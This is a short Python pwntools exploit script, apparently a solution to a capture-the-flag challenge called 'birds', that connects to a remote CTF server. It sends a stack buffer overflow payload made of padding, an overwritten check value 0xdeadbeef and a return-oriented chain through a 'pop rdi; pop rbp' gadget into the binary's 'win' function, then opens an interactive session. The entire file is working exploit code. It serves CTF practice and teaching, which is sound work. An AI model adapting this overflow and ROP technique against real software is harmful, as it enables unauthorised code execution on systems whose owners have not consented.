#!/usr/bin/env python3

from pwn import *

exe = ELF("./birds_patched")

context.binary = exe

gdb_script = """
b * main + 111
c
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdb_script)
    else:
        r = remote("tjc.tf", 31625)

    return r


def main():
    r = conn()
    r.recvuntil(b"wrong!")

    payload = flat(
        "A" * 76,
        p32(0xdeadbeef),
        "B" * 8,
        p64(0x00000000004011c0), # Address of pop rdi; pop rbp
        p64(0xA1B2C3D4),
        p64(0xA1B2C3D4),
        p64(exe.symbols['win']),  # Address of the win function
    )
    r.sendline(payload)

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
